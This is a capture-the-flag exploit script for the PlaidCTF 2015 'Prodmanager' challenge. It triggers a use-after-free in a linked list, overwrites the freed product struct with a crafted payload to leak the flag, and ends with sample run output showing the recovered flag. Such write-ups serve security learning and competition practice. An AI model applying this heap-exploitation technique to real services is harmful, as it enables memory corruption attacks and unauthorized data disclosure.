#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# PlaidCTF 2015 
# PWNABLE Prodmanager - 180pts
# Use-after-free in double linked list
#
# danigargu @ w3b0n3s
#
# run as tcp server (debugging in local):
# socat -d -d TCP-LISTEN:4667,fork EXEC:"./prodmanager"
#

import telnetlib
from struct import pack, unpack

HOST = '52.5.68.190'
PORT = 4667

p = lambda x : pack("<L", x)   # pack

class ProductManager:
    def __init__(self, host, port):
        self.s = telnetlib.Telnet(host, port)

    def select_option(self, option):
        self.s.read_until("Input: ")
        self.s.write("%d\n" % option)
    
    def create_product(self, name, price):
        self.select_option(1)
        self.s.read_until("name: ")
        self.s.write("%s\n" % name)
        self.s.read_until("price: ")
        self.s.write("%d\n" % price)

    def remove_product(self, name):
        self.select_option(2)
        self.s.read_until("remove: ")
        self.s.write("%s\n" % name)

    def add_to_lowest_manager(self, name):
        self.select_option(3)
        self.s.read_until("add: ")
        self.s.write("%s\n" % name)

    def create_profile(self, data):
        self.select_option(5)
        self.s.read_until("profile!\n")
        self.s.write(data + "\n")
    
    def see_lowest_products(self):
        self.select_option(4)
        self.s.interact()

def main():

    flag = 0x0804C3E0 - 24

    products = {
        'A':3,
        'B':1,
        'C':4,
        'D':2
    }

    try:
        print "[*] connecting to %s:%d" % (HOST, PORT) 
        pd = ProductManager(HOST, PORT)

        for name, price in products.iteritems():
            print "[i] adding product %s with price %d" % (name, price)
            pd.create_product(name, price)

        print "[i] adding products to lowest price manager"
        for name in products:
            pd.add_to_lowest_manager(name)

        print "[i] removing last inserted product to launch use-after-free"
        pd.remove_product('D')

        print "[i] creating profile to overwrite content of removed product"

        # malloc(76) == sizeof(struct product)
        payload =  p(0)             # product->price
        payload += p(0)             # product->next
        payload += p(0)             # product->prev
        payload += p(0)             # product->smaller
        payload += p(flag)          # product->major
        payload += p(flag+100)      # product->high?
                                    # product->name (50 bytes)

        pd.create_profile(payload)

        print "[i] lowest 3 products:"
        pd.see_lowest_products()

    except KeyboardInterrupt:
        print "Exiting..."
    except Exception, e:
        print e

if __name__ == '__main__':
    main()


"""
$ python prodmanager.py 
[*] connecting to 52.5.68.190:4667
[i] adding product A with price 3
[i] adding product C with price 4
[i] adding product B with price 1
[i] adding product D with price 2
[i] adding products to lowest price manager
[i] removing last inserted product to launch use-after-free
[i] creating profile to overwrite content of removed product
[i] lowest 3 products:
Lowest product is B
 ($1)
Lowest product is 
 ($0)
Lowest product is flag{pr10r1ty_0nly4mY_QQQs} ($0)
"""